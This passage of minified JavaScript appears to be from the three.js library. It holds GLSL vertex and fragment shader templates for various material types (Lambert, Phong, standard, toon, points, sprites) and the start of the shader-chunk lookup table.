	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = packDepthToRGBA( dist );
}`,Mu=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
}`,bu=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,Tu=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,Au=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,Ru=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,wu=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Cu=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Pu=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Iu=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,Lu=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Du=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,Nu=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <packing>
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( packNormalToRGB( normal ), opacity );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,Ou=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Uu=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Fu=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,ku=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
		float sheenEnergyComp = 1.0 - 0.157 * max3( material.sheenColor );
		outgoingLight = outgoingLight * sheenEnergyComp + sheenSpecularDirect + sheenSpecularIndirect;
	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,zu=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Bu=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Gu=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,Hu=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,Vu=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Wu=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <packing>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Xu=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );
	vec2 scale;
	scale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );
	scale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,qu=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Ie={alphahash_fragment:hc,alphahash_pars_fragment:mc,alphamap_fragment:_c,alphamap_pars_fragment:gc,alphatest_fragment:vc,alphatest_pars_fragment:xc,aomap_fragment:Ec,aomap_pars_fragment:yc,batching_pars_vertex:Sc,batching_vertex:Mc,begin_vertex:bc,beginnormal_vertex:Tc,bsdfs:Ac,iridescence_fragment:Rc,bumpmap_pars_fragment:wc,clipping_planes_fragment:Cc,clipping_planes_pars_fragment:Pc,clipping_planes_pars_vertex:Ic,clipping_planes_vertex:Lc,color_fragment:Dc,color_pars_fragment:Nc,color_pars_vertex:Oc,color_vertex:Uc,common:Fc,cube_uv_reflection_fragment:kc,defaultnormal_vertex:zc,displacementmap_pars_vertex:Bc,displacementmap_vertex:Gc,emissivemap_fragment:Hc,emissivemap_pars_fragment:Vc,colorspace_fragment:Wc,colorspace_pars_fragment:Xc,envmap_fragment:qc,envmap_common_pars_fragment:Yc,envmap_pars_fragment:jc,envmap_pars_vertex:Kc,envmap_physical_pars_fragment:od,envmap_vertex:$c,fog_vertex:Zc,fog_pars_vertex:Qc,fog_fragment:Jc,fog_pars_fragment:ed,gradientmap_pars_fragment:td,lightmap_fragment:nd,lightmap_pars_fragment:id,lights_lambert_fragment:rd,lights_lambert_pars_fragment:sd,lights_pars_begin:ad,lights_toon_fragment:ld,lights_toon_pars_fragment:cd,lights_phong_fragment:dd,lights_phong_pars_fragment:ud,lights_physical_fragment:pd,lights_physical_pars_fragment:fd,lights_fragment_begin:hd,lights_fragment_maps:md,lights_fragment_end:_d,logdepthbuf_fragment:gd,logdepthbuf_pars_fragment:vd,logdepthbuf_pars_vertex:xd,logdepthbuf_vertex:Ed,map_fragment:yd,map_pars_fragment:Sd,map_particle_fragment:Md,map_particle_pars_fragment:bd,metalnessmap_fragment:Td,metalnessmap_pars_fragment:Ad,morphcolor_vertex:Rd,morphnormal_vertex:wd,morphtarget_pars_vertex:Cd,morphtarget_vertex:Pd,normal_fragment_begin:Id,normal_fragment_maps:Ld,normal_pars_fragment:Dd,normal_pars_vertex:Nd,normal_vertex:Od,normalmap_pars_fragment:Ud,clearcoat_normal_fragment_begin:Fd,clearcoat_normal_fragment_maps:kd,clearcoat_pars_fragment:zd,iridescence_pars_fragment:Bd,opaque_fragment:Gd,packing:Hd,premultiplied_alpha_fragment:Vd,project_vertex:Wd,dithering_fragment:Xd,dithering_pars_fragment:qd,roughnessmap_fragment:Yd,roughnessmap_pars_fragment:jd,shadowmap_pars_fragment:Kd,shadowmap_pars_vertex:$d,shadowmap_vertex:Zd,shadowmask_pars_fragment:Qd,skinbase_vertex:Jd,skinning_pars_vertex:eu,skinning_vertex:tu,skinnormal_vertex:nu,specularmap_fra